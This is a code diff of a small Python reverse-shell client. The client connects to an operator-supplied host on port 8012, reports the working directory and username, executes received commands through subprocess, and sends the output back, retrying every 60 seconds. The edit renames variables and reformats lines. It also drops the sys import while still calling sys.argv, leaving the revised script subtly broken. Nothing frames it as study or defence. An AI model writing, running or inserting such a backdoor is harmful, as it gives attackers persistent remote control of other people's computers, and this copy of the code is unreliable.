@@ -1,38 +1,37 @@
-import socket
-import os
 import subprocess
+import socket
 import time
-import sys
+import os
 
-SERVER_HOST = sys.argv[1]
-SERVER_PORT = 8012
-BUFFER_SIZE = 1024 * 128
-SEPARATOR = "<sep>"
+HOST = sys.argv[1]
+PORT = 8012
+SIZE = 1024 * 128
+SEP  = "<sep>"
 
 while True:
     try:
         s = socket.socket()
-        s.connect((SERVER_HOST, SERVER_PORT))
+
+        s.connect((HOST,PORT))
+
         cwd = os.getcwd()
-        s.send(cwd.encode())
-        s.send(os.getlogin().encode())
+        s.send(cwd.encode('utf-8'))
+        s.send(os.getlogin().encode('utf-8'))
         while True:
-            command = s.recv(BUFFER_SIZE).decode()
-            splited_command = command.split()
-            if splited_command[0].lower() == "cd":
+            command = s.recv(SIZE).decode('utf-8')
+            cmd = command.split()
+            if cmd[0].lower() == 'cd':
                 try:
-                    os.chdir(' '.join(splited_command[1:]))
+                    os.chdir(' '.join(cmd[1:]))
                 except FileNotFoundError as e:
-                    output = str(e)
+                    out = str(e)
                 else:
-                    output = ""
-            elif splited_command[0].lower() == "test":
+                    out = ''
+            elif cmd[0].lower() == 'true':
                 continue
             else:
-                output = subprocess.getoutput(command)
+                out = subprocess.getoutput(command)
             cwd = os.getcwd()
-            message = f"{output}{SEPARATOR}{cwd}"
-            s.send(message.encode())
+            s.send(f"{out}{SEP}{cwd}".encode('utf-8'))
     except:
-        s.close()
         time.sleep(60)
